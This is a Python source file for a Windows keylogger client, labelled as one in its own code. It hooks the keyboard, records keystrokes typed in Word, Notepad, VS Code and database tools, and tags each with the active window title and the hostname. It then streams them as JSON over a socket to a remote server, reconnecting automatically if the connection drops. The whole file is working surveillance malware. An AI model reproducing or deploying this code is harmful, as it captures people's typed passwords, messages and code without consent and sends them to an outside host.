import socket
import json
import time
from datetime import datetime
from pynput import keyboard
import win32gui
import win32process
import psutil
import socket as sk

from config import server_config


ALLOWED_APPS = [
    "WINWORD.EXE",
    "notepad.exe",
    "Code.exe",
    "MySQLWorkbench.exe",
    "heidisql.exe"
]


def get_active_process_name():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        return psutil.Process(pid).name()
    except:
        return None


def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "Unknown"


class KeyloggerClient:
    def __init__(self):
        self.server_ip = server_config.SERVER_IP
        self.server_port = server_config.SERVER_HOST
        self.sock = None
        self.word_buffer = ""
        self.view_id = sk.gethostname()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                print("[+] Connected to server")
                return
            except Exception as e:
                print(f"[!] Cannot connect: {e}. Retry in 3s...")
                time.sleep(3)

    def send_keystroke(self, key_data, window_title):
        try:
            msg = {
                "KeyData": key_data,
                "WindowTitle": window_title,
                "ViewID": self.view_id,
                "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            self.sock.sendall((json.dumps(msg) + "\n").encode())

        except:
            print("[!] Lost connection → reconnecting...")
            self.connect()

    def flush_buffer(self):
        if self.word_buffer:
            self.send_keystroke(self.word_buffer, get_active_window_title())
            self.word_buffer = ""

    def on_press(self, key):
        try:
            process = get_active_process_name()
            if process not in ALLOWED_APPS:
                return

            window = get_active_window_title()

            if hasattr(key, "char") and key.char:
                if key.char.isalnum():
                    self.word_buffer += key.char
                else:
                    self.flush_buffer()
                    self.send_keystroke(key.char, window)

            else:
                self.flush_buffer()

                special_keys = {
                    keyboard.Key.space: "[SPACE]",
                    keyboard.Key.enter: "[ENTER]",
                    keyboard.Key.backspace: "[BACKSPACE]"
                }

                self.send_keystroke(
                    special_keys.get(key, str(key)),
                    window
                )

        except Exception as e:
            print("❌ Error:", e)

    def start(self):
        print("[*] Keylogger. Starting...")
        self.connect()

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        while True:
            time.sleep(1)


if __name__ == "__main__":
    KeyloggerClient().start()
